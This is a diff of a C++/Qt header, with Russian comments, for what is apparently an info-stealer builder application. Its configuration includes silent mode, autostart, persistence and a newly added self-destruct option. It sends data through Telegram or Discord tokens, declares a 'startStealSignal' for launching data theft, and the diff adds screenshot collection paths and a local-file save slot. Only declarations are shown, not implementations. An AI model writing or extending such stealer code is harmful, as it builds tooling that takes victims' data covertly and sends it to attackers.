@@ -83,6 +83,7 @@ public:
         bool silent = false;               // Включение тихого режима
         bool autoStart = false;            // Включение автозапуска
         bool persist = false;              // Включение персистентности
+        bool selfDestruct = false;         // Включение самоуничтожения
         std::string sendMethod = "Local File";  // Метод отправки данных (Telegram, Discord, Local File)
         std::string buildMethod = "Local Build"; // Метод сборки (Local Build, GitHub Actions)
         std::string telegramToken = "";         // Токен для Telegram
@@ -139,6 +140,9 @@ public:
     QAction* actionExit;                   // Действие для выхода из приложения
     QAction* actionAbout;                  // Действие для отображения информации о программе
 
+    // Вектор для хранения путей к скриншотам
+    std::vector<std::string> screenshotsPaths;
+
 signals:
     void logUpdated(const QString& message); // Сигнал для обновления логов
     void startStealSignal();                // Сигнал для запуска процесса кражи данных
@@ -175,6 +179,7 @@ private slots:
     void sendData(const std::string& filePath);    // Отправка данных
     void sendToTelegram(const std::string& filePath); // Отправка данных в Telegram
     void sendToDiscord(const std::string& filePath);  // Отправка данных в Discord
+    void saveToLocalFile(const std::string& filePath); // Сохранение данных в локальный файл
 
     // Слоты для управления конфигурацией и логами
     void saveConfig(const QString& fileName = QString()); // Сохранение конфигурации
